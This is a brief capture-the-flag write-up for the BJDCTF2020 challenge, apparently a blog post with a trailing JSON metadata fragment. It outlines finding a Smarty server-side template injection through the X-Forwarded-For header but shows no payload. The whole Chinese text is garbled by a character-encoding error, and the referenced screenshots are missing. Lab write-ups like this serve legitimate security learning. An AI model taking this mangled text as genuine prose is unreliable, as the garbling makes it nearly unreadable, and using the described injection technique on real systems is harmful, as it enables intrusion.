é¦–å…ˆæ‰¾åˆ°hintï¼š\né¡ºç€hintéšä¾¿æ‰¾äº†ç¯‡æ–‡ç« ï¼šphpè·å–å®¢æˆ·ç«¯IPåœ°å€çš„å‡ ç§æ–¹æ³•\næµ‹è¯•äº†ä¸€ä¸‹å‘ç°æ˜¯XFFï¼š\nå› ä¸ºå…ˆåšäº†Cookie is so stableè¿™ä¸€é¢˜ï¼Œä¸¤ä¸ªé¡µé¢å·®ä¸å¤šï¼Œè¿hintçš„ä½ç½®éƒ½ä¸€æ ·ï¼Œæ‰€ä»¥å…ˆè€ƒè™‘SSTIï¼š\næ ¹æ®ä¸Šé¢çš„å›¾æœ€åæµ‹è¯•å‡ºæ¥æ˜¯Smartyï¼š\nç½‘ä¸Šæœpayloadç›´æ¥æ‰“ï¼š\n","date":"2020-09-28T14:42:08+08:00","permalink":"https://k1te.cn/p/bjdctf2020/","title":"BJDCTF2020"}]